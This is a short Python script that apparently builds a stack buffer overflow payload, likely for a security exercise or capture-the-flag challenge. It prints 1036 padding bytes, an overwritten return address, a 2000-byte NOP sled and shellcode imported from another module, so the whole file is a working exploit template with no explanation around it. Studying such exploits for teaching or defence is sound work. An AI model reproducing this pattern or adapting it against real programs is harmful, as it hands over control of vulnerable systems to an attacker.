from shellcode import shellcode
import sys
sys.stdout.buffer.write(b"a"*1036 + 0xfff6faff.to_bytes(4, "little") + b"\x90"*2000 + shellcode)